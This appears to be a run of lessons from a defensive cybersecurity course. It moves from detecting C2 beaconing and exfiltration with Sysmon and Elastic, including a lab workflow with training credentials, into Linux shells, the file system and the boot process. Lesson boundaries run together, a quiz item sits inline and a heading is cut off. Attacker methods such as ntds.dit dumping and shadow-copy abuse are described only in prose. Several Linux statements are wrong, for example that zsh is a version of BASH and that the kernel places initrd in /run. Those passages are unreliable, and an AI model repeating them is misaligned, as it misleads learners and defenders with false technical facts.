A more detailed list of events emerges when this information is logged and correlated with other event logs. Sysmon ID 1 displays process creation along with the hash of the file. Sysmon ID 7 displays when an image is loaded into memory and provides information on whether the binary is digitally signed. A Security Information and Event Management (SIEM) tool alerts on subtle combinations of events, which defenders can use to create powerful signatures.

﻿

Detecting C2 ﻿

This section covers various ways to detect C2 at the host and network layers. There are many ways to detect C2 activity due to its varied nature. Several successful strategies include checking for a specific tactic by analyzing specific logs, checking for anonymous behavior in general, and looking for contextual inconsistencies.

﻿

Hypothetical Signature to Detect DNS Calculation (T1568.003) ﻿

One way to detect C2 is to check for a specific tactic by analyzing specific logs. Below is a list of expected behavior for this tactic and their related data sources:

Process loads that is not digitally signed

Sysmon Event ID 7: Image Loaded

Request for a domain

Sysmon Event ID 22: DNSEvent

Process connects to an IP address

Sysmon Event ID 3: Network Connection

Windows Event ID 5156: The Windows Filtering Platform has permitted a connection

The content from these logs needs to be put in context for this signature to work. The process name from the ID 7 log would be seen in the ID 22 and ID 3 logs. Then, the alert would fire when the IP that was resolved in ID 22 did not match ID 3 within a certain time frame.

﻿

Detecting Frequency-Based Network Connections ﻿

C2 protocols used by malware are going to vary significantly. As defenders find new ways of detecting these C2 channels, the attackers will find new ways to hide them. One constant, however, goes back to the original problem that beaconing malware is trying to solve. That is, getting past a firewall that does not allow inbound connections.

﻿

Attackers cannot freely communicate with a system on the other side of a firewall that is blocking inbound connections. Instead, that system has to go outbound to the attacker. That means there is this delicate balance between the attacker being able to communicate with the malware and how noisy the malware is going to be on the network when reaching back out. A higher frequency of outbound connections shortens the maximum time an attacker has to wait. Conversely, if the time between beacons is too long, it becomes difficult for the attacker to gain access when required.

﻿

Figure 3.5-1, below, illustrates how the number of beacons an attacker employs in a day affects attacker convenience and stealth. More beacons rapidly increase attacker convenience up to a certain point, before convenience only increases incrementally. This greater convenience comes at the cost of an exponential decrease in stealth.

﻿

﻿

Figure 3.5-1﻿

﻿

The most obvious beaconing malware has a static amount of time between beacons. The beacons are the same. A beacon, in this sense, is any of the previously mentioned C2 TTPs. Malware can be more tricky. The outbound connections for malware can be spaced out and more sporadic. Malware may even rotate through domains with a DGA.

﻿

Beacons are also short messages that do not have much data. These messages only check for commands to execute. If there is a command to execute, then more data is transmitted, but not necessarily to the same system. For example, an infected system asks the C2 server for a command, but the C2 server replies with a command to upload a file to a secondary system.

﻿

Beacons Need Context ﻿

In the early 2010s, the Air Force saw a surge in alerts describing a known beacon for malware. For a moment, it looked like hundreds of computers were compromised. What actually happened was malicious actors had broken into a legitimate website and added a Hypertext Markup Language (HTML) comment on the front page of a small town's local news site.

﻿

This malware worked by loading the news site, just like a normal user, then cutting out that special comment as a means of C2. None of the systems in the Air Force network were infected. The normal user activity appeared identical to malicious activity at the network layer.

﻿

One major benefit of host-based logging for these types of signatures is that the log contains more information than what is logged at the network level. Sysmon allows logging of the exact process that is making a web request. This helps determine if a known good process was making that web request or if it was a binary that was recently added to the machine. There are ways around this as an attacker. If the attacker had done process injection into a web browser, then all the attackers requested would be coming out of that "known good" process.

﻿

Detecting Anomalous Artifacts within Web Request Artifacts ﻿

All web requests have a metadata section called "headers." This is where clients advertise their compatible browser versions and attach any cookies. The server also has details in these headers to help facilitate communication. Complicated software, such as a web browser, has a lot of "edge cases" or rare situations to account for. Malware clients and servers are dramatically simpler and do not have these requirements. In an effort to blend in with legitimate traffic, malware pre-populates these fields with data that can be convincing, but does not perfectly match the chaos of actual web traffic.

﻿

User-Agent Strings (Request Header)﻿

﻿

Network clients announce their compatibility with certain software versions to servers. This is done over the web with a user-agent string. The default user agent string for a system running Chrome 70.0.3538.77 is as follows:

Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36. ﻿

This string starts with "Mozilla/5.0" even though this is Chrome. Mozilla is a non-profit that makes Firefox. The reason it is in all of these user-agent strings is because the string is showing what this client is compatible with so the server has a better chance of understanding how to present the webpage.

﻿

User-agent strings are one of those small details that are hard to keep up-to-date. Even if the installed malware hard-codes the exact user agent string used by the system's browser, it only takes one update to make it stand out again.

﻿

Server Value (Response Header)﻿

﻿

When a web client asks for data from a server, the response has headers populated by the server. One of these fields is just called "server" and has the name and version of the web server. A bad malware author may not adjust this detail and the malware server may be easy to identify.

﻿

Encryption﻿

﻿

In an ironic twist, encryption is used by malicious actors to make computer systems more insecure. With a Hypertext Transfer Protocol Secure (HTTPS) connection, the malicious traffic becomes significantly more difficult to analyze because the entire connection, including headers, is unreadable.

﻿

Systems do exist to enable defenders to see within encrypted traffic and are available to large organizations with deep pockets. The way these work is also ironic because they use a common attacker technique called Person-In-The-Middle (PITM). With this setup, all hosts within a network make secure, encrypted communications to a web proxy. Then, that web proxy makes a secure, encrypted connection to the website. Within that machine, the network traffic is unencrypted and can be logged and manipulated by network defense technologies.

﻿

These systems are expensive because they need to have specialized hardware to support fast encryption processing.

Detect Beaconing C2 There are many ways to detect beaconing C2 activity. The next two workflows provide the opportunity to detect and hunt beaconing C2 activity using Elastic.

﻿

Detect Beaconing C2 Activity ﻿

Elastic transforms are one way to smartly condense information. Elastic stores information in individual rows that help identify trends across multiple points of data. This helps detect C2 beaconing activity. The transformation in this workflow creates a new data source based on the specific rules. This data can be used, just like any other log source, in the Discover section of Kibana.

﻿

Complete the following workflow to detect beaconing C2 behavior using an Elastic pivot transform.

﻿

Workflow ﻿

Log in to the Virtual Machine (VM) win-hunt using the following credentials:
Username: trainee Password: CyberTraining1! ﻿

Open the Chrome browser.
﻿

Log in to the Security Onion Console (SOC) with the following credentials and select the Transforms - Elastic bookmark.
URL: https://199.63.64.92/kibana/app/management/data/transform Username: trainee@jdmss.lan Password: CyberTraining1! ﻿

Select Create your first transform and choose :so- as the source.
﻿

On the page Create transform, select Pivot.
﻿

Configure the Pivot Transform query as follows:
Index pattern: :so- event.category: network and not destination.ip: 127.0.0.1 ﻿

Ensure the Transform query is recorded by pressing the enter key to execute the query. Watch for the Elastic logo to animate and the section Transform preview, at the bottom of the page, to update with the results from the transform query.
﻿

Configure the grouping and aggregation rules for this transformation as follows:
Group by: terms(agent.name) terms(destination.ip) terms(destination.port) date_histogram(@timestamp), interval: 1h

Aggregations: value_count(agent.id) ﻿

The purpose of the group by options and aggregations can be seen in the section Transform preview. With this configuration, a new data source is created that counts how many times each host has reached out to a particular destination IP address and port within a one-hour time frame. Each connection has a unique agent.id field. The method value_count shows the total number of connections by a host.

﻿

Select Next and enter the following Transform details:
Transform ID: host_dest_port_count Transform description: Shows the number of connections between systems within a 1 hour time frame Destination Index: host_dest_port_count_index ﻿

Select Next.
﻿

Select Create and Start to run this transform on all data.
﻿

The results of the grouping and aggregation are indexed to enable quick searching. This process takes a few minutes.

﻿

Return to the page Discover.
﻿

Change the index pattern from :so- to host_dest_port_count_index.
﻿

Narrow the query down to the following time range and sort by the number of connections:
Start: Mar 23, 2022 @ 12:00:00.00 End: Mar 25, 2022 @ 00:00:00.00 ﻿

Select the following columns:
agent.name destination.ip destination.port agent.id.value_count ﻿

NOTE: If the column agent.id.value_count is not sorting as expected, deselect the default sorting based on time.

﻿

Filter out any connection data going to or from the dc-01 host with the following query:
not agent.name: dc01 and not destination.ip: 172.16.2.5 and not destination.ip: 10.10.* ﻿

NOTE: The 10.10.* network range in the query is the administrative part of the simulated environment and not part of this scenario.

﻿

Use the information from this workflow to answer the following question.

Recognizing Data Exfiltration TTPs Exfiltration Behaviors on the Network ﻿

Data exfiltration is simply unauthorized data being removed from a network. It occurs when attackers have successfully exploited a target network and are attempting to pilfer the contents.

﻿

Figure 3.5-6, below, summarizes exfiltration TTPs documented by the MITRE ATT&CK framework. In this illustration, arrows moving away from the file indicate exfiltration tactics that cause the data to be removed from the system. Arrows pointing towards the file indicate exfiltration tactics that aid in defense evasion. Defense evasion tactics are mix-and-match and are able to be used in conjunction with other tactics.

﻿

﻿

Figure 3.5-6﻿

﻿

The most common exfiltration techniques are just over the existing C2 channel using HTTPS. HTTPS blends in with normal web traffic and most organizations do not have the hardware to tear apart the encryption.

﻿

Exfiltration Behaviors on the Host ﻿

Exfiltration is relatively straightforward, however, there are a few things that attackers may stumble upon. These behaviors are present in the logs and in actionable hunt hypotheses.

﻿

Dynamically Changing File ﻿

Imagine an attacker wants to download a large file that gets updated on a regular basis. These files may include anything from databases to large PowerPoint files filled with images. One way to deal with this is to stage the file in a secondary location. Moving a copy of a file is much easier because the data can be broken up into smaller chunks and exfiltrated low and slow. Without the intermediary file, the file segments produce a corrupted file.

﻿

Hunting for staged exfiltrated files is a good starting point for networks that are assumed to have had a large amount of data exfiltrated. This is especially true if the logs for these networks also do not show any significant traffic spikes.

﻿

Common places for data to be staged include the user's or operating system's temp directory. These files also tend to be compressed. The MITRE ATT&CK framework has an extensive list of threat actors and their favorite places to stage files.

﻿

Possible staged file attributes include the following:

Large file size

Located in a temp folder

Compression

Incorrect file extension (such as a zip file that is labeled as .log)

Read/Write access is inconsistent with other temp files in that folder (For example, if the folder is for Google Chrome, but Chrome is not the program accessing the files)

Operating System Does Not Allow Access to the File ﻿

In a Windows computer system when a program needs to access a file the program asks the operating system for a "file handle." A handle is a temporary reference number the program gives back to the operating system when it wants to read or write from that resource. In Linux, this is called a "file descriptor." Forensically knowing what files a program is manipulating provides insight into the function of that program.

﻿

The file handle or file descriptor is a way for the operating system to ensure that only one program is able to manipulate a file at a time. If a program is actively reading or writing to a file, then other programs will not be able to get access to that data. This is referred to as a file being "locked open."

﻿

Antivirus software uses the file handle step to scan files for viruses and similar threats when a user tries to open the file. This saves the antivirus software from having to constantly recheck every file on a system every time a new malware signature is added. While unlikely, it is possible for an attacker to generate logs by trying to open a non-malicious file and inadvertently triggering the antivirus program to create an alert.

﻿

Attackers have developed several different methods for getting data from a file that is locked, including the following:

Raw file system access

Vssadmin

Diskshadow

NTDSUtil

﻿

Raw File System Access﻿

﻿

The operating system is interacting with the underlying file system when it reads and writes data to the file on the hard disk. It is possible for a program to bypass the operating system and directly access the volume (T1006). Since PowerShell has the same capabilities as a compiled program, there exists a PowerShell script that can directly access files on the disk named "NinjaCopy." This technique bypasses an antivirus that is watching for programs to access a file as well as any administrative controls on the file defined in the operating system.

﻿

MITRE ATT&CK links these attack techniques to threat actors. This technique has not been seen used by any particular threat actor, however, this technique is also extremely difficult to detect and mitigate. Currently, the only known detection method is installing Sysmon and monitoring for Event ID 9: Raw disk access. Enabling that logging increases system load.

﻿

The good news is that this requires admin access, anyway, so the bypassing of administrative controls is not as bad as it sounds. There are also a limited number of systems that benefit from this logging, namely just the domain controller.

﻿

Vssadmin﻿

﻿

VSSADMIN is a built-in Windows command that is used to manipulate volume shadow copies. A volume shadow copy is a Microsoft technology that can create backup copies of files or volumes even when they are in use.

﻿

A hacker leverages this technology by making a volume shadow copy of the drive with the locked files, copying over the locked files, and then deleting the volume shadow copy.

﻿

Diskshadow﻿

﻿

Diskshadow is a built-in Windows command that replaces vssadmin for modern operating systems. Diskshadow is for Windows 8+ era operating systems, however vssadmin also works.

﻿

﻿

NTDSUtil﻿

﻿

The "crown jewel" of files that exists within a network lies on the domain controller. It is the file ntds.dit. This file is the database that stores active directory data, which includes usernames and passwords for every user. It is locked because the domain controller is always actively using it.

﻿

Ntdsutil is a Windows built-in command that is used to perform database maintenance functions for active directory domains. The function that attackers use is its ability to create a full dump of the ntds.dit database to disk. The dumped data is then exfiltrated.

﻿Data Exfiltration Data Sources Exfiltration Log Sources ﻿

At the most basic level, exfiltration is moving data out of the network. Network traffic-based logs are the most useful sources for identifying exfiltration. However, there are also several other sources on the host that help with this identification.

﻿

Network Layer Detection ﻿

Bytes sent and received and the number of connections in a given time are useful metrics to capture and analyze. At the network layer, these data sources are found on the respective network devices responsible for providing those services. DNS logging is best provided at the lowest level, nearest the host. Network connection logs are important to collect at the service, instead of just at the boundary firewall. This is because the service provides additional context where the boundary device, such as a firewall, only provides metadata on the connection.

﻿

Producer-Consumer Ratio (PCR) ﻿

The PCR is a simple ratio of upload versus download, as demonstrated in Figure 3.5-7, below. While PCR does not directly correlate with malicious activity, it is an additional indicator for defenders to consider. Coupled with other indicators, PCR provides additional insight into the traffic.

﻿

This illustration below shows how PCR is calculated. A session that is biased towards downloading data has a negative value, with -1 indicating 100% download. A session that is biased towards uploading has a positive value, with 1 indicating 100% upload. Over large datasets, certain protocols converge to various values. For example, web browsing is typically around -0.5 while activity such as sending an email is normally around 0.4. Protocols such as Network Time Protocol (NTP) and Address Resolution Protocol (ARP) tend to send and receive equal amounts of traffic. They are considered "balanced" in terms of the PCR.

﻿

Host Layer Detection ﻿

It is harder to hide malware in host-based logs due to the additional context. At the network layer, a web request only contains the source and destination along with the message. At the host layer more context is available. Not only is the exact binary known at the host level, but that binary's digital signature status is also apparent.

﻿

Detecting Staging ﻿

Data staging has a few attributes that produce forensic evidence on the host. If the attacker uses built-in Windows commands to make a copy of a dynamic or locked file, then the creation of those processes can be captured by a properly configured Sysmon deployment. These processes include NTDSUtil, Diskshadow, and VSSAdmin. The process creation generates a Sysmon Event ID 1: Process Creation, Sysmon Event ID 7: Image loaded, and a Windows Event ID 4688.

﻿

If the attacker is using a tool such as Ninja-Copy to do raw file system access (T1006), the corresponding Sysmon event for this particular technique is Event ID 9: RawAccessRead.

﻿

Regardless of how the attacker makes a copy of the file, the staged file generates a Sysmon Event ID 11: FileCreate and a Windows Event ID 4663.

﻿

Detecting Anomalous Network Connections ﻿

Host-based network traffic logging is covered by Windows Event ID 5156 and Sysmon Event ID 3. Both of these events provide the name of the executable using the network, as well as the metadata on the network connection (source, destination IP, and port). Coupled with Sysmon Event ID 7, the defender is armed with the hash and knowledge of whether or not the binary is digitally-signed and trusted by the host.

﻿

One way for the attacker to bypass this type of logging is to inject the malicious payload into a process that normally conducts network traffic. For example, the attacker may have a binary that exfiltrates data out of the network that spoofs a Firefox user-agent string. In this case, injecting that library into a running Firefox browser makes discovery of the exfiltration difficult, even for a host-based analyst.

﻿

While an injected payload makes data exfiltration harder to discover in the logs, it just means that the defender needs to detect process injection. Detecting process injection is outside the scope of this lesson, however, this is another technique that Sysmon detects, with the proper configuration. Further reading on process injection is available at the MITRE ATT&CK website. Currently, eleven different techniques are documented by MITRE.

﻿Elastic Scripting Primer The previous section of this lesson provided the logic behind calculating the PCR. The following workflow provides a script to detect PCR in web traffic. This section provides a brief refresher and explanation of the scripting concepts used in the upcoming workflow.

﻿

Below, Figure 3.5-8 describes the steps in the Elastic script scripted_metric. The major stumbling block is that Elastic runs the scripts in parallel to speeding up searches. This means that the script does not provide all the search items at a single time. Instead, the search is broken apart into “shards.” Elastic executes each shard independently before bringing them back together into a single final output.

﻿

The four sections of the scripted_metric include init_script, map_script, combine_script, and reduce_script. Only the first section, init_script, is optional. The rest of the sections are required. The sequence for these sections is as follows:

﻿

init_script: Defines variables to use between the map_script and combine_script steps.

A query filters all items into shards for the rest of the script. This step defines the state variables for each shard.

map_script: Maps the given Elastic documents into the variables defined in the init_script step.

The values within the searched documents are in scope at this step and can be accessed in the code. This step stores data, but does not return anything.

combine_script: Returns data.

This is the last step Elastic runs in parallel against the shards. The data returned is aggregated into a list and passed to reduce_scripts as the variable “states.” This data can be as simple as the data structure from the init_script step or it can use logic to create a new data structure.

reduce_script: Combines all the data from the individual shards into a usable output.

All outputs from the combine_script step are put into a combined list called states. This step implements any final logic and returns data as a single, final output.

Ternary Operators ﻿

A ternary operator is a coding shortcut for reducing the number of lines of code required for a script. Software developers use these to shorten the code and make it easier to read. In Elastic, the limited space to write code means that ternary operators are commonly used to keep the text short.

Figure 3.5-9, below, displays an example of script logic in the usual coding format, followed by its equivalent as a ternary operator.

Augmented Assignment ﻿

Augmented assignments are also common shortcuts. In software, it is common to iterate through a list of items and count the number of items that meet certain criteria.

﻿

Figure 3.5-10, below, illustrates an example of common augmented assignment shortcuts. In this example, each code block provides a different way to perform the same function. The code blocks each count the total number of items that are of type car. The shortcuts +=, in the center code block, and ++ in the right-most code block are both shortcuts for the highlighted portion of the first block. Similarly, the operator -- decrements a number by one.

Examining Linux Shells Linux shells come in many flavors. The main reason to pick a specific shell is based on how it helps automate the tasks that need to be completed. Users familiar with Linux need to at least know BASH because it is the default shell for most Linux distributions. Other commonly used shells include the following:

Portable Operating System Interface (POSIX) Shell

Debian Almquist Shell (DASH)

Z Shell (zsh)

C shell (csh)

Korn Shell (ksh)

Tenex C Shell (tcsh)

Friendly Interactive Shell (fish)

Common features shared by various shells include automatic command or filename completion, loggable command history, text formatting for legibility, and even autocorrection. A common secondary shell for UNIX-based operating systems is Z Shell (zsh) because of its robust feature set. It became the default login shell for MacOS in 2019, and the system shell for Kali Linux in 2020. Understanding how to best use these shells helps defenders more accurately and efficiently hunt for information.

﻿

Comparing Linux Shells ﻿

Linux shells contain a wide range of features. The table below compares some of the most common shells and the systems in which they are found.

Shell Features and Benefits ﻿

Features that assist users with entering commands to a system are described below:

Command History: Use a keyboard shortcut to rerun previously run commands, or view which commands have already been run. The commands are usually referenceable in run order.

Command Scripting: Command shells also double as scripting languages, allowing users to automate instructions on a host.

Tab Completion: Using tab while writing commands causes a shell to attempt to automatically complete the intended command based on context. For example, filename completion is based on the currently active directory when a filename would be too complex or inconvenient to enter manually.

File Globbing: Entering a wildcard such as an asterisk allows the shell to execute commands on all files that match part of a given bit of text. For example, a user could specify that they want to move *.txt which would pattern match all files that end in .txt and move them at the same time.

When not using a shell, users have to be exact in the syntax of the commands they run on the filesystem, and they can normally execute only one task at a time. Since command line shells became standard for many operating systems, using a shell has become the norm.

Specifics of Common Shells Three of the most commonly used shells are briefly described in this section.

﻿

BASH ﻿

The Bourne Again Shell (BASH) was a replacement for the default Unix Bourne shell, and is now the default login shell for many distributions of Linux. A version of BASH is also available for Windows 10 via the Windows subsystem for Linux. BASH enables users to run commands concurrently with the session, meaning the commands are executed immediately, or to process commands in a batch so that they're executed in order. BASH also contains built-in bug reporting for debugging scripting issues through the use of the command bashbug.

﻿

Z Shell ﻿

Z Shell zsh is a UNIX shell that is a version of BASH with improved features. Many power users describe zsh as an upgraded version of BASH, and it is preferred by many professionals seeking more powerful options for scripting. For instance, when entering commands, BASH stops tab completion at the last common character, while zsh cycles through the possible options without needing to be forced to show the user options. For example, if a user wants to execute commands from the folder /usr/bin/things/, but that system also contains the folders /usr/bin/thin/ and /usr/bin/thing/, zsh cycles through each potential completion option with only partial text entered.

﻿

zsh is installed by default on the Kali distribution of Linux. Therefore, many security professionals find it necessary to master zsh if their work involves heavy use of Kali.

﻿

Other useful features of zsh are command history shared among all system shells, better file globbing without needing to run the find command, spelling correction, compatibility modes, and user-loadable modules that contain pre-written snippets of code.

﻿

POSIX ﻿

The POSIX shell comes from the Institute of Electrical and Electronics Engineers (IEEE) POSIX standard, and the shell exists to create a common scripting language between certified operating systems (OS). Any POSIX-certified OS should be able to communicate with any other POSIX-certified OS without users needing to be concerned with specific shell upgrade maintenance. POSIX is based on the C programming language but contains additional features over the American National Standards Institute (ANSI) C standard like file management, regular expressions (regex), networking management, memory management, and system process handling.

Which Linux shell exists to guarantee a scripting standard as long as the operating system is certified? posix Although users can enter commands into a terminal one instruction at a time, a shell provides what additional functionalities?

inux File System Overview Linux File Philosophy ﻿

The Linux operating system is designed with and operates on the philosophy that everything is a file. This concept provides a common abstraction for a variety of input and output operations. Resources such as documents, devices, directories, memory, and even inter-process communications are expressed as file objects.

﻿

Index Nodes (inodes) ﻿

Each file is described by a unique inode. The inode is the data structure that contains all necessary metadata about a file, including type, permissions, number of hard links, ownership, size, timestamps, and a list of pointers to all data blocks in which the file data resides. This list of metadata in the inode is called the File Control Block (FCB). The inode itself is unique on a file system. Two different files, even if named identically, have two different inode numbers. Any hard links to a file, however, share its inode number, since a hard link essentially points to the same file, and changes to a hard link result in changes to an original file. Every file, regardless of its type, has an inode number.

File Types ﻿

The six Linux file types are listed below:

Regular files

Directories

Special files

Links

Domain Sockets

Named Pipes

Regular Files ﻿ Regular files contain normal data and could be text files, executable files, documents, or any other data-containing file. These are often used for input or output to normal programs.

Directories ﻿ Directories are files that are a list of other files. The list contains the inodes of files that are contained in that directory.

Special Files ﻿ Special files are mechanisms for input and output to devices and do not contain data. Instead, they serve as the doorway through which data is sent. Special files are primarily located in the /dev directory.

Links

Link files are pointers to an inode located in the file system (hard links) or to a filename that points to an inode located in the file system (soft links). The original file and any of its hard links point to identical data because they are the same inode. So any changes to an original file or any of its hard links are experienced by the others. Hard links may only be made of regular files, and not directories or special files. If the original file is deleted, any hard links continue to successfully operate. Soft links, on the other hand, are broken if the original file is deleted, since they point to that filename rather than the inode itself.

Domain Sockets

These files are a special file type that facilitates inter-process networking and communication. They are protected by the file system’s access control. These are similar to networking sockets, such as those which communicate Transmission Control Protocol (TCP) or User Datagram Protocol (UDP) traffic, but all communication takes place within the Linux kernel rather than over a network interface.

Named Pipes

Named Pipes files are another form of interprocess communication, but do not conform to network socket semantics. However, like regular files, these named pipes have owners, permissions, and metadata.

﻿Linux Standard Directory Structure In all Linux distributions, the file structure is a standard directory tree. These directories are included under the root directory by convention so that all distributions operate with a similar structure and software, operating knowledge, and tooling is portable across the Linux ecosystem of distributions.

bin The bin directory contains common programs shared by the system, the system administrator and the users. Bin is short for binary. In Linux, this is where basic programs and applications are located. Binary files are the executable files that contain compiled source code. Almost all basic Linux commands can be found in bin, such as ls, cat, touch, pwd, rm, and echo. The binaries in this directory must be available in order to attain minimal functionality for the purposes of booting and repairing a system.

boot

The boot directory contains the startup files and the kernel vmlinuz. This is where the boot loader lives. It contains the static bootloader, kernel executable, and configuration files required to boot a computer. Some recent distributions include GRUB data. GRUB is the GRand Unified Bootloader and is an attempt to get rid of the many different boot-loaders available.

dev ﻿ The dev directory references all the Central Processing Unit (CPU) peripheral hardware, which is represented as two files with special properties: block files and character files. These two types of files allow programs to access the devices themselves, for example, to write data to a serial port and read a hard disk. It is of interest to applications that access devices. These files are known as device nodes, which give user-space access to the device drivers in the operating system’s running kernel.

Block files: These are device files that provide buffered access to system hardware components. They provide a method of communication with device drivers through the file system. Data is written to and read from those devices in “blocks,” which is how these files receive their name.

Character files: These are also device files that provide unbuffered serial access to system hardware components. They work by providing a way of communication with devices by transferring data one character at a time, leading to the name Character files.

etc

The etc directory contains configuration files for critical system services such as networking, authentication, initialization, and terminals. For example, the files that contain the name of the system, the users and their passwords, the names of machines on the network, and when and where the partitions on the hard disks are mounted.

Of particular note, the file system configuration information is located in /etc/fstab, which is the file system table. The file system table is a configuration file that governs mounting and unmounting the file systems on a machine. This lists each device by its Universally Unique Identifier (UUID), the mount point, the file system type (several of which are discussed later), the read and write privileges, and other options used by the kernel for mounting, backing up a drive, and other operations.

home ﻿ The home directory contains home directories of the common users, and personal configuration files, which are usually hidden. If there is a conflict between personal and system-wide configuration files, the settings in the personal files take priority.

lib ﻿ The lib directory contains library files and includes files for programs needed by the system and the users. These library files are programs that are shared among other binary applications. Binary files inside bin and sbin use these library files extensively. The directory contains the all-important kernel modules. The kernel modules are drivers that make devices like the video card, sound card, and Wi-Fi, printer function properly.

﻿ media ﻿ The media directory is where the operating system automatically mounts external removable devices such as Universal Serial Bus (USB) thumb drives.

mnt

The mnt directory is the standard mount point for external file systems. Any devices or storage mounted here is done manually. This may include external hard drives, network drives, and others. In older file systems that do not include /mount, other plug and play devices may be mounted here as well.

opt ﻿ The opt directory stands for optional. It typically contains extra and third party software that is optional. Any applications which are manually installed should reside here. Part of the installation process usually involves writing files to /usr/local/bin and /usr/local/lib directories as well.

proc

The proc directory, which is short for process, is the virtual file system containing information about system resources. This includes information about the computer, such as information about the CPU and the kernel that the Linux system is running. More detail about this directory is included later in this lesson.

root

The root directory is the administrative user's home directory.

run

Linux distributions since about 2012 have included the run directory as a Temporary File System (TMPFS) which stores Random Access Memory (RAM) runtime data. That means that daemons like systemd and udev, which are started early in the boot process (and perhaps before /var/run was available) have a standardized file system location available where they can store runtime information. Since files in this directory are stored on RAM, they disappear after shutdown.

sbin ﻿ The sbin directory contains programs for use by the system and the system administrator. The shortened term for system binary is sbin. Similar to bin, it is a place for storing executable programs. But these executable programs are essential for system configuration, maintenance, and administrative tasks. Linux has decided to discriminate between normal binaries and these system binaries. In other words, this directory is reserved for programs essential for booting, restoring, and recovering.

usr

The usr directory contains programs, libraries, documentation, and other files for all user-related programs. The name usr stands for UNIX System Resources. It belongs to the user applications as opposed to /bin or /sbin directories which belong to system applications. Any application installed here is considered nonessential for basic system operation. However, this is one of the most important directories in the system because it contains all the user-level binaries, their documentation, libraries, header files, etc. This directory is read-only and applications cannot write anything into it unless the system is configured improperly.

The usr directory contains several subdirectories, which are described below:

/usr/bin - Contains the vast majority of binaries on the system. Binaries in this directory have a wide range of applications, such as vi, firefox, gcc, curl, etc.

/usr/sbin - Contains programs for administrative tasks. They need privileged access. Similar to /sbin, they are not part of $PATH.

/usr/lib - Contains program libraries. Libraries are collections of frequently used program routines.

/usr/local - Contains self-compiled or third-party programs. This directory is similar in structure to the parent /usr directory and is recommended to be used by the system administrator when installing software locally.

/usr/src - Contains kernel sources, header-files and documentation.

/usr/include - Contains all header files necessary for compiling user-space source code.

/usr/share - Contains shareable, architecture-independent files, such as docs, icons, and fonts. It is recommended that any program which contains or requires data that doesn’t need to be modified store them in this subdirectory (or /usr/local/share, if installed locally).

srv ﻿ The srv directory contains data for servers. If an organization was running a web server from a Linux machine, the Hypertext Markup Language (HTML) files for its sites would go into /srv/http or /srv/www. If they were running a File Transfer Protocol (FTP) server, the files would go into /srv/ftp.

sys﻿

Like /proc and /dev, sys is another virtual directory and also contains information from devices connected to the computer. The Sys File System (SYSFS) contains files that provide information about whether devices are powered on, their vendor name and model, what bus the device is plugged into, etc. These files are used by applications that manage devices. If /dev is the doorway to the device itself, /sys files are the addressing and signage to the devices.

tmp

The tmp directory contains temporary files, usually placed there by applications. The files and directories often contain data that an application doesn’t need when the files are written, but may need later on. The files placed in this directory are often cleaned during reboot, so it is not ideal for persistent storage. ﻿ var ﻿ The var directory is the storage for all variable files and temporary files created by users, such as log files, the mail queue, the print spooler area, or space for temporary storage of downloaded files. These are typically files and directories that are expected to grow in size. For example, /var/crash holds information about every time a process has crashed. Or /var/log contains all log files for the computer and its applications, which grow constantly.

Linux Boot Procedure File system artifacts in the boot, dev, and etc directories are integral to booting a Linux system. Booting from no power to full operating system capability in Linux is a multi-step process, described below.

Basic Input/Output System (BIOS)

In the first stage of the boot process, the BIOS performs integrity checks of the hard drive. These checks are called Power On Self Test (POST). The boot process then searches for the boot loader program, which is in the Master Boot Record (MBR). The MBR is typically located in the first data sector of the hard drive, in the file /dev/hda or /dev/sda. It contains the GNU GRUB. When the boot loader program is detected, it is loaded into memory, executed, and given control of the system. ﻿

NOTE: Newer Linux systems use Unified Extensible Firmware Interface (UEFI) to conduct the first stage of the boot process. UEFI boots more quickly and allows booting drives larger than two terabytes (TB). Linux systems using UEFI may also use Globally Unique Identifier Partition Table (GPT) instead of MBR. GPT supports more partitions and drives larger than two TB.

﻿ GRUB

This boot loader uses the file /boot/grub2/grub.conf or the file /boot/grub/grub.conf (in older systems) as the configuration to load itself, load the Linux kernel into memory, then hand execution over to the kernel. The splash screen visible during the boot process is a marker for when the GRUB boot loader is operating. Most operating systems distributed since 2015 are running the second version of the boot loader, GRUB2.

The Logical Volume Manager (LVM) is often used in parallel with the boot loader. The LVM manages drive storage, allowing users to allocate space between drive partitions without unmounting.

﻿ NOTE: Instead of GRUB, Linux systems using UEFI may use Systemd-boot as their boot loader. Systemd-boot integrates with UEFI, enabling the use of UEFI boot entries.

Kernel ﻿ The kernel is the core of the operating system in Linux. When it takes control of the boot process, it first loads the init daemon and establishes a temporary file system in the /run directory, known as Initial RAM Disk (INITRD) for the System V init daemon or Initial RAM File System (INITRAMFS) for the systemd init daemon.

Init Daemon ﻿ The init daemon takes on the process identifier of 1 and is responsible for starting all system services and monitoring them. The System V init daemon was widely used in older versions of Linux and remains in use in the Alpine and Gentoo distributions. All others have replaced this subsystem with the Systemd init daemon, which was designed with faster booting and better dependency management.

System V init ﻿

In older Linux operating systems, the System V init program, also known as SysVinit, is located at /etc/init and uses the /etc/inittab file to determine the runlevel of the operating system at startup, which is a setting that determines the state of the operating system and its running services. The runlevels are listed below:

Run Level 0: Power Off

Run Level 1: Rescue or Single User Mode

Run Level 2: Multiple User mode without a Network File Storage (NFS)

Run Level 3: Multiple User mode without a Graphical User Interface

Run Level 4: User Definable

Run Level 5: Multiple User mode with a Graphical User Interface

Run Level 6: Reboot

Most Linux systems that use this system boot to runlevel 3 or 5 by default.

When the runlevel is determined, the init program searches the respective directory /etc/rc.d (such as /etc/rc0.d/) for the runlevel scripts corresponding to the setting and executes them. The location of these directories may change for the various Linux distributions.

Systemd ﻿

Modern operating systems use the systemd init daemon instead of System V. The systemd binary is located at /lib/systemd and uses a configuration file located at /etc/systemd/system/default.target to identify the state into which the system is booted. The most common states are graphical.target, which is comparable to runlevel 5 in the SysV configuration, or multi-user.target, which is comparable to runlevel 3 in the SysV configuration. These states are defined in files of the same name, which are systemd unit files. These files stipulate the requirements, execution parameters, and relationships of system services. All operating system states include the following target files:

halt.target - Brings the system to a halt without powering it down.

poweroff.target - Called during a power off operation.

emergency.target - Defines single user mode. This includes only an emergency shell with no services and no mounted file system.

rescue.target - Similar to emergency mode, but includes the mounting of the file system and the starting of a few very basic services.

multi-user.target - Starts all system services, but provides only a command line interface (CLI) to the user.

graphical.target - Identical to multi-user.target, but adds a Graphical User Interface (GUI).

reboot.target - Defines system operations during a reboot operation.

default.target - Called during system start. It should always be a symbolic link to multi-user.target or graphical.target.

Before reaching these states, the dependencies must be resolved. Systemd walks back through the configuration files to the most essential services and starts them before calling the target file in question.

﻿

